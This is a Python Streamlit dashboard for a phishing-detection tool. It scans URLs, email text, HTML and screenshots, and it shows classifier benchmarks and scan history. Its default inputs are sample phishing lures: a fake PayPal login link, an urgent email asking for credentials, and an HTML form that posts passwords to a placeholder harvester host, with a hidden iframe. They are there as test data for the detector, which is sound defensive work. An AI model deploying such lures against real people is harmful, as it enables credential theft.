"""
Streamlit Web Dashboard for Phishing Detection & ML Model Benchmarking.
Run with: streamlit run frontend/app.py
"""

import json
from pathlib import Path
import pandas as pd
import streamlit as st

from backend.detection.engine import DetectionEngine
from backend.database.db import get_recent_scans, get_scan_stats, init_db

st.set_page_config(
    page_title="PhishShield AI - Security Dashboard",
    page_icon="🛡️",
    layout="wide",
)

ROOT_DIR = Path(__file__).resolve().parent.parent
METRICS_PATH = ROOT_DIR / "ml" / "saved_models" / "metrics.json"

init_db()
engine = DetectionEngine()

st.title("🛡️ PhishShield AI — Threat Detection & Defense Platform")
st.markdown("Multi-Modal AI & Machine Learning security suite for phishing analysis across URLs, emails, HTML DOM, and screenshots.")

tab1, tab2, tab3, tab4, tab5, tab6, tab7 = st.tabs([
    "🔗 URL Scanner",
    "✉️ Email & Text NLP",
    "📄 HTML DOM Inspector",
    "🖼️ Image / Screenshot",
    "📊 Analytics & Stats",
    "🤖 ML Benchmarks",
    "📜 Audit History",
])

with tab1:
    st.subheader("Live URL Threat Analysis")
    col1, col2 = st.columns([3, 1])
    with col1:
        test_url = st.text_input(
            "Enter target URL for inspection:",
            value="http://192.168.1.100/paypal/login.php?verification=token",
            key="url_input_box"
        )
    with col2:
        st.write("")
        st.write("")
        scan_button = st.button("Scan URL", type="primary", use_container_width=True)

    if scan_button and test_url:
        result = engine.scan_url(test_url, include_features=True)

        res_col1, res_col2, res_col3 = st.columns(3)
        with res_col1:
            st.metric("Security Verdict", result.verdict.value)
        with res_col2:
            st.metric("Calibrated Threat Score", f"{result.risk_score}/100")
        with res_col3:
            st.metric("ML Model Confidence", f"{result.confidence * 100:.1f}%")

        st.info(f"**Explanation:** {result.explanation}")

        if result.heuristic_flags:
            st.warning(f"⚠️ **Security Flags ({len(result.heuristic_flags)}):**")
            for flag in result.heuristic_flags:
                st.write(f"- {flag}")
        else:
            st.success("✅ No suspicious heuristic signals detected.")

        with st.expander("Extracted 29-Feature Numerical Vector", expanded=False):
            if result.features:
                feat_df = pd.DataFrame(list(result.features.items()), columns=["Feature Name", "Extracted Value"])
                st.dataframe(feat_df, use_container_width=True)

with tab2:
    st.subheader("Email & Phishing Text NLP Analyzer")
    email_sub = st.text_input("Subject:", value="URGENT: Your account has been suspended within 24 hours")
    email_body = st.text_area(
        "Email Body Content:",
        value="Security Alert: Unauthorized login attempt detected. Action required immediately within 24 hours. Update your billing credentials and confirm your password at http://192.168.1.100/paypal/login.php?verification=token",
        height=120
    )
    if st.button("Analyze Email Content", type="primary"):
        res = engine.scan_email(subject=email_sub, body=email_body)
        c1, c2 = st.columns(2)
        with c1:
            st.metric("Email Threat Verdict", res.verdict.value)
        with c2:
            st.metric("Overall Risk Score", f"{res.risk_score}/100")

        st.info(f"**NLP Security Assessment:** {res.explanation}")

        if res.embedded_urls:
            st.subheader("Embedded Hyperlinks Scanned")
            for u in res.embedded_urls:
                st.write(f"- **{u.url}** → `{u.verdict.value}` ({u.risk_score}/100)")

with tab3:
    st.subheader("HTML DOM & Credential Form Inspector")
    base_u = st.text_input("Base URL:", value="http://legitimate-looking-bank.com")
    html_raw = st.text_area(
        "HTML Source Code:",
        value='<form action="http://malicious-harvester.xyz/steal.php" method="POST">\n  <input type="password" name="password">\n</form>\n<iframe style="display:none;" src="http://hidden.cc"></iframe>',
        height=140
    )
    if st.button("Inspect HTML Structure", type="primary"):
        res = engine.scan_html(html_raw, base_url=base_u)
        c1, c2 = st.columns(2)
        with c1:
            st.metric("DOM Verdict", res.verdict.value)
        with c2:
            st.metric("DOM Risk Score", f"{res.risk_score}/100")

        st.info(f"**Explanation:** {res.explanation}")
        if res.flags:
            st.warning("**DOM Security Flags:**")
            for f in res.flags:
                st.write(f"- {f}")

with tab4:
    st.subheader("Webpage Screenshot & Visual Analyzer")
    uploaded_file = st.file_uploader("Upload screenshot or image:", type=["png", "jpg", "jpeg"])
    if uploaded_file and st.button("Analyze Image"):
        bytes_data = uploaded_file.read()
        res = engine.scan_image(bytes_data, filename=uploaded_file.name)
        c1, c2 = st.columns(2)
        with c1:
            st.metric("Visual Verdict", res.verdict.value)
        with c2:
            st.metric("Visual Risk Score", f"{res.risk_score}/100")

        st.info(f"**Explanation:** {res.explanation}")
        st.write(f"Dimensions: `{res.dimensions['width']} x {res.dimensions['height']} px` | Color Variance: `{res.color_variance}`")

with tab5:
    st.subheader("Aggregated Threat Intelligence & Stats")
    stats = get_scan_stats()
    m1, m2, m3, m4 = st.columns(4)
    with m1:
        st.metric("Total Inspections", stats["total_scans"])
    with m2:
        st.metric("Average Risk Score", f"{stats['average_risk_score']:.1f}/100")
    with m3:
        high_crit = (stats["verdicts"].get("HIGH", 0) + stats["verdicts"].get("CRITICAL", 0))
        st.metric("High/Critical Threats", high_crit)
    with m4:
        st.metric("Safe Sites", stats["verdicts"].get("LOW", 0))

    st.subheader("Verdicts Distribution")
    st.bar_chart(pd.Series(stats["verdicts"]))

    if stats["top_heuristic_flags"]:
        st.subheader("Top Flagged Security Heuristics")
        top_df = pd.DataFrame(stats["top_heuristic_flags"])
        st.dataframe(top_df, use_container_width=True)

with tab6:
    st.subheader("Machine Learning Benchmark Evaluation")
    if METRICS_PATH.exists():
        with open(METRICS_PATH, "r", encoding="utf-8") as f:
            metrics_data = json.load(f)

        st.info(f"**Champion Model:** `{metrics_data.get('champion_model', 'N/A')}` | "
                f"**Evaluation Dataset:** {metrics_data.get('test_sample_count', 0)} URLs (Isolated 20% Test Split)")

        models_dict = metrics_data.get("models", {})
        summary_rows = []
        for name, m in models_dict.items():
            summary_rows.append({
                "Classifier": name,
                "Accuracy": f"{m['accuracy'] * 100:.2f}%",
                "Precision": f"{m['precision'] * 100:.2f}%",
                "Recall": f"{m['recall'] * 100:.2f}%",
                "F1-Score": f"{m['f1_score'] * 100:.2f}%",
                "ROC-AUC": f"{m['roc_auc'] * 100:.2f}%",
            })
        st.dataframe(pd.DataFrame(summary_rows), use_container_width=True)

        st.subheader("Feature Importances")
        for name, m in models_dict.items():
            top_feats = m.get("top_features", {})
            if top_feats:
                st.write(f"**{name} Top Features:**")
                st.bar_chart(pd.Series(top_feats))
    else:
        st.warning("Metrics file not found.")

with tab7:
    st.subheader("Audit & Inspection History")
    history = get_recent_scans(limit=50)
    if history:
        st.dataframe(pd.DataFrame(history), use_container_width=True)
    else:
        st.info("No scans recorded yet.")
